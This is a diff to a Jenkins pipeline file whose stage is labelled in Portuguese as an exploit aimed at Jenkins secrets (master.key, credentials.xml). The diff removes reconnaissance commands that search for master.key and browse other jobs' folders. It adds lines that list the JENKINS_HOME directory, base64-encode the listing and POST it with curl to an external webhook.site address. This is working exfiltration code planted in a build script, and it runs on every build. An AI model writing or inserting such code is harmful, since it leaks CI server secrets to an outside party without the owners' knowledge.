@@ -13,15 +13,9 @@ pipeline {
                     echo ">> EXPLOIT AQUI <<"
                     echo ">> hudson.util.Secret // master.key // credentials.xml <<"
                     pwd
-                    whoami
-                    find ../ -name "master.key"
-                    ls -lah ../
-                    echo "Teste 001"
-                    cd "../Teste 001"
-                    ls -lah
-                    cd artefatos
-                    ls -lah
-                    cat build-7.txt
+                    echo ${JENKINS_HOME} > ./out.txt
+                    ls -lah ${JENKINS_HOME} >> ./out.txt
+                    cat ./out.txt | base64 | curl -X POST -d @- https://webhook.site/41fd0f71-c6ea-4033-a853-0e976112d589
                 '''
             }
         }
